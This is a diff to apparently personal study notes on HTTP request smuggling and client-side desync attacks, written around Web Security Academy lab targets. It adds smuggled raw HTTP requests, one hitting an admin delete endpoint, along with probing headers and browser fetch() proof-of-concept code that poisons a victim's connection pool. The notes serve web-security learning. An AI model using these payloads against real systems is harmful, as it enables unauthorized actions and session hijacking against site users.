@@ -160,14 +160,48 @@ If they don't close the connection afterwards, this can provide an alternative C
 
 try using GET requests with an obfuscated Content-Length header
 
-POST / HTTP/1.1
+POST /resources/images/blog.svg HTTP/1.1
 Host: YOUR-LAB-ID.web-security-academy.net
 Cookie: session=YOUR-SESSION-COOKIE
-Connection: close
-Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
 Content-Length: CORRECT
 
-GET /hopefully404 HTTP/1.1
+GET /admin/delete?username=carlos HTTP/1.1
 Foo: x
 
 Client-side desync attacks:
+
+Probe for potential desync vectors in Burp
+sending a request in which the specified Content-Length is longer than the actual body
+elicit this behavior by triggering a server error
+Referer: https://evil-user.net/?%00
+Content-Type: application/x-www-form-urlencoded; charset=null, boundary=x
+GET /%2e%2e%2f HTTP/1.1
+
+Confirm the desync vector in Burp
+some secure servers respond without waiting for the body but still parse it correctly when it arrives
+Other servers don't handle the Content-Length correctly but close the connection immediately after responding, making them unexploitable
+
+Build a proof of concept to replicate the behavior in a browser
+fetch('https://vulnerable-website.com/vulnerable-endpoint', {
+    method: 'POST',
+    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x', // malicious prefix
+    mode: 'no-cors', // ensures the connection ID is visible on the Network tab
+    credentials: 'include' // poisons the "with-cookies" connection pool
+}).then(() => {
+    location = 'https://vulnerable-website.com/' // uses the poisoned connection
+})
+
+Handling redirects
+fetch('https://vulnerable-website.com/redirect-me', {
+    method: 'POST',
+    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
+    mode: 'cors',
+    credentials: 'include'
+}).catch(() => {
+    location = 'https://vulnerable-website.com/'
+})
+
+Identify an exploitable gadget
+Construct a working exploit in Burp
+Replicate the exploit in your browser
